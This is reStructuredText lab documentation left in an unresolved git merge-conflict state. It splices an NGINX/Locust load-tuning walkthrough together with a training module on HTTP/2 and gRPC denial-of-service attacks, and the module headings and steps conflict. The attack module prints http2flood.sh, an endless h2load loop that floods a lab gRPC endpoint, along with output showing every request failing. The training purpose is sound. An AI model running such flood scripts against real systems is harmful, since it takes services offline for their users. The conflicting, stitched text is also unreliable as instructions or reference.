<<<<<<< HEAD
Getting familiar with the Lab
#############################


The lab consists of multiple components: 

*   NGINX Proxy: A reverse proxy / load balancer on which we will be tuning the configuration to achieve better performance for the applications
*   App Server: The backend application server, serving up the content
*   Locust Worker: Generates the traffic load
*   Locust Controller: Manages the Locust Worker instance and provides a GUI interface for monitoring load 
*   NGINX Instance Manager: A web based application for managing NGINX instances. You will use this to update the NGINX Proxy's configuration file.

|
|

Here is a diagram of the components and how they connect together: 

.. image:: /class8/images/lab-diagram.jpg  
  :width: 800 px


The Locust load generation tool will be retrieving a 1.5MB file from the backend application server. 

Review the Environment

|
|

1) **Log in to NGINX Proxy**
   
Click on ACCESS and then WEB SHELL

.. image:: /class8/images/nginx-web-shell.png
  :width: 600 px
  :align: center

|
|

2) **Review the nginx.conf file and some of the parameters already set**

  `view /etc/nginx/nginx.conf`

upstream app_servers config block includes

* zone backend 64k: Defines a shared memory zone allowing NGINX worker processes to synchronize information on the backend's run-time state. This enables us to display upstream statistics on the NGINX Plus dashboard.

server config block includes 

* status_zone my_proxy: Defines a shared memory zone allowing NGINX worker processes to collect and synchronize information on the status of the server. This enables us to monitor HTTP server statistics in the NGINX Plus dashboard.

.. image:: /class8/images/codeblock.png
  :width: 600 px
 
|
|

3) **Go to NGINX Proxy Dashboard and review**

|

Under ACCESS for the NGINX Proxy, select NGINX+ DASHBOARD

|

.. image:: /class8/images/nginx-web-shell.png
  :width: 600 px
  :align: center

|
|

Review the Dashboard and what is included under the tabs across the top of the page
	
.. image:: /class8/images/n-dashboard.png  

* HTTP Zones: this section contains the zone we defined in the proxy's server block. It tracks collective requests, responses, traffic and SSL statistics. Note that SSL statistics are missing because for simplicity, we do not use SSL for this lab.
* HTTP Upstreams: this sections contains statistics on the upstreams or backends that we defined in the proxy's upstream block. It tracks connections, requests, responses, health statistics and other information related to the proxy's connection to the application server.
* Workers: this section containers statistics that are specific to individual NGINX worker processes.
* Caches: this section is not yet visible. Later in the lab we will turn caching on and this section will display statistics related to the health of our proxy's cache.

|
|

4) **Start up Locust controller software**
   
Log on to the Locust Controller cli or WEB SHELL

Review the Locust configuration files

   `cat /home/ubuntu/run_locust_controller.sh`

   `cat /home/ubuntu/locustfile.py`

Notice that the Locust load script is configured to get a file called "1.5MB.txt", effectively putting load on the proxy.

Now start up the Locust controller and web interface.

   `/home/ubuntu/run_locust_controller.sh`

|
|

5) **Access the Locust Controller Web Interface**

Under Locust Controller ACCESS click on LOCUST to bring up the Web Interface

.. image:: /class8/images/locus-gui.png  

|
|

6) **On Locust Worker node**
   
Log on to the Locust Worker cli or WEB SHELL

|

.. image:: /class8/images/locust-controller-gui.png

|

Verify 8-core machine, run this command to verify CPUs and their associated statistics

   `mpstat -P ALL`  
  
.. image:: /class8/images/locus-cpu.png  

|

Start up locust workers by running this command:

   `/home/ubuntu/start_locust_workers.sh`

|
This script with start all 8 workers (1 per CPU) in NOHUP mode, meaning you can close the shell window and they'll keep running. However, it's best to keep this window open to monitor the workers, which will log their output to nohup.out.

Tail the nohup.out file to monitor Locust workers
  `tail -f /home/ubuntu/nohup.out`

Sometimes, overloading Locust may cause worker threads to quit. We've tuned this lab so that shouldn't happen, but if it does, you'll want to terminate the workers and restart them. You can use the previously shown script to restart the workers. To terminate them, we've included the following script:
  `/home/ubuntu/terminate_locust_workers.sh`
|

7) **In Locust GUI, start the load generation**
Let's begin with a basic test to get a performance baseline with our default settings. 
   
Number of Users: 100

Spawn rate: 10

Host: http://10.1.1.9/

Advanced Options, Run time: 30s

.. image:: /class8/images/locus-10-100-30.png  

|

Click the 'Start swarming' button

|
|


8) **Review graphs as they are generated**
   
.. note:: What is happening with Total Request per Second and Response Time graphs 
	
Click the Charts tab to review graphs as they are generated

|
|

9) **Run same test again**

Run the same test a 2nd time by clicking 'New test' at the top-right under 'Status STOPPED'. Keep the settings the same as before and click the 'Start swarming' button.

|

.. image:: /class8/images/locus-new-test.png 

Review NGINX Proxy CPUs while test is running.  Back on NGINX Proxy WEB SHELL: 

  `mpstat -P ALL 1`

.. note:: How much CPU is being used?  Is the system fully saturated? 
	

Review Locust GUI Charts

.. note:: Even when all test parameters are the same, tests will exhibit different results due to a multitude of external factors influencing system and network resources.
|
|

10) **Run another test but this time with more load**

Number of Users: 500

Spawn rate: 50

Host: http://10.1.1.9/

Advanced Options, Run time: 30s

.. image:: /class8/images/locus-50-500-30.png  
   :width: 200 px

Review NGINX Proxy CPUs and the Locust GUI Charts

|

.. note::  How much CPU is being used?  Is the system fully saturated? How was Total Request per Second affected by this additional load
	
|
|

11) **Run same test again and review NGINX Dashboard**
 
How many Active connections?

In HTTP Zones, review total requests and responses



.. toctree::
   :maxdepth: 2
   :hidden:
   :glob:

=======
<<<<<<<< HEAD:docs/class5/module6/module6.rst
Module 6 - HTTP/2 and GRPC DoS Attack on an Unprotected Application
###################################################################
========
Module 1 - HTTP/2 and GRPC DoS Attack on Unprotected Application
################################################################
>>>>>>>> origin/master:docs/class8/module1/module1.rst

In this module you will generate **good** and malicious traffic. With the addition of malicious traffic will cause the good traffic to error out. We will utilize HTTP/2 and gRPC as part of this module.

Demonstrate the effects of HTTP/2 and gRPC attacks on an unprotected application
-----------------------------------------------------------------------------------

<<<<<<<< HEAD:docs/class5/module6/module6.rst
Generate legitimate traffic

   1. In UDF, Click on Access for the **Legitimate Traffic Generator** VM and select WebShell (or ssh into the box if you set that up)

   2. We will utilize the **good.sh** bash script in order to generate HTTP 1 traffic using **curl**, HTTP 2 traffic using **h2load** and using Python3 with route_guide_client to generate gRPC traffic.
========
Generate legitimate traffic 
   1. In UDF, Click on Access for the **legitimate traffic** VM and select WebShell (or ssh into the box if you set that up)
   2. We will utilize the good.sh bash script in order to generate HTTP 1 traffic using **curl**, HTTP 2 traffic using **h2load** and using Python3 with route_guide_client to generate gRPC traffic.
>>>>>>>> origin/master:docs/class8/module1/module1.rst

.. code-block:: bash 
   :caption: /good.sh

   #!/bin/bash
   cd /grpc/examples/python/route_guide/

   IP=10.1.1.4
   PORT=600
   URI='good_path.html'

   declare -a array=("/#/login" "/#/about" "/assets/public/images/products/apple_pressings.jpg" "/#/search")

   while true; do
   echo
   python3 /grpc/examples/python/route_guide/route_guide_client.py  2>&1 | grep "Finished\|502"
   h2load -n 10 -c 10 --header="te: trailers " --ciphers=AES128-GCM-SHA256  https://10.1.1.4:443/testing/ &> /dev/null

   URI=${array[$(( RANDOM % 3 ))]}
   curl -b cookiefile -c cookiefile -L -s -o /dev/null -w "JUICESHOP HTTP Code:%{http_code}\n" -A "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5" -H "X-Forwarded-For: 3.3.3.1" http://${IP}:${PORT}/${URI} &
   echo
   URI=${array[$(( RANDOM % 3 ))]}
   curl -b cookiefile -c cookiefile -L -s -o /dev/null  -A "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.112 Safari/534.30" -H "X-Forwarded-For: 3.3.3.2" http://${IP}:${PORT}/${URI} &
   URI=${array[$(( RANDOM % 3 ))]}
   curl -b cookiefile -c cookiefile -L -s -o /dev/null  -A "Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3" -H "X-Forwarded-For: 3.3.3.3" http://${IP}:${PORT}/${URI} &


3. Run the good traffic shell script and keep it running:

``./good.sh``
    
Output from the script: 

.. code:: shell 
 
   JUICESHOP HTTP Code:200 Finished trip with 10 points

   JUICESHOP HTTP Code:200 Finished trip with 10 points

   JUICESHOP HTTP Code:200 Finished trip with 10 points 


Start HTTP/2 Flood attack
<<<<<<<< HEAD:docs/class5/module6/module6.rst

   1. Back in the UDF, click **Access** on the **Attack Traffic Generator** VM and select WebShell. Position this tab side-by-side with the **Legitimate Traffic Generator** WebShell tab that is already open so you can see both WebShells at the same time.
========
   1. Back in the UDF, click 'Access' on the **Attacker** VM and select WebShell
>>>>>>>> origin/master:docs/class8/module1/module1.rst

.. code-block:: bash
   :caption: http2flood.sh
   
   #!/bin/sh
   while true; do
      h2load -n 10000 -c 1000 http://10.1.1.4:500/routeguide.RouteGuide/GetFeature
   done


2. Run the http2 flood script for 15 seconds and keep it running:

``./scripts/http2flood.sh``

Attack script Output

.. code:: shell 

   finished in 1.07s, 9350.31 req/s, 2.09MB/s
  requests: 10000 total, 10000 started, 10000 done, 0 succeeded, 10000 failed, 0 errored, 0 timeout
  status codes: 0 2xx, 0 3xx, 0 4xx, 10000 5xx
  traffic: 2.23MB (2339000) total, 527.34KB (540000) headers (space savings 45.45%), 1.50MB (1570000) data
                       min         max         mean         sd        +/- sd
  time for request:      625us       1.02s     52.83ms     25.29ms    85.84%
  time for connect:     9.42ms     28.08ms     20.14ms      4.61ms    70.10%
  time to 1st byte:    35.60ms       1.04s     96.07ms     66.04ms    99.60%
  req/s           :       9.56       21.66       17.79        1.69    72.90%
  starting benchmark...
  spawning thread #0: 1000 total client(s). 10000 total requests
  Application protocol: h2c
  progress: 10% done
  progress: 20% done
  progress: 30% done
  progress: 40% done
  progress: 50% done
  progress: 60% done
  progress: 70% done
  progress: 80% done
  progress: 90% done
  progress: 100% done

<<<<<<<< HEAD:docs/class5/module6/module6.rst
3. Click back on to the WebShell on the **Legitimate Traffic Generator** VM. Did the output from the script change? Output should no longer show "Finished trip with 10 points", because gRPC is failing, and you may see one of the following two error messages:
========
3. Click back on to the WebShell on the legitimate VM. Did the output from the script change? Output now shows the HTTP/2 service is experiencing an outage.
>>>>>>>> origin/master:docs/class8/module1/module1.rst

   .. code:: shell

      "debug_error_string = "UNKNOWN:Error received from peer {created_time:"2024-01-26T15:39:49.83945022+00:00", grpc_status:2, grpc_message:"Stream removed"}""

<<<<<<<< HEAD:docs/class5/module6/module6.rst
   .. code:: shell

      E0129 18:20:43.992650291 4639 hpack_parser.cc:999] Error parsing 'content-type' metadata: invalid value

4. Stop the HTTP2Flood attack running on the Attack Traffic Generator host by pressing **Ctrl+C**

5. On the Legitimate Traffic Generator WebShell, press **Ctrl+C** to exit the script
========
4. Stop the HTTP2Flood attack running on the Attacker host by pressing CTRL+C
5. On the legitimate traffic WebShell, press CTRL+C to exit the script
>>>>>>>> origin/master:docs/class8/module1/module1.rst
>>>>>>> origin/master
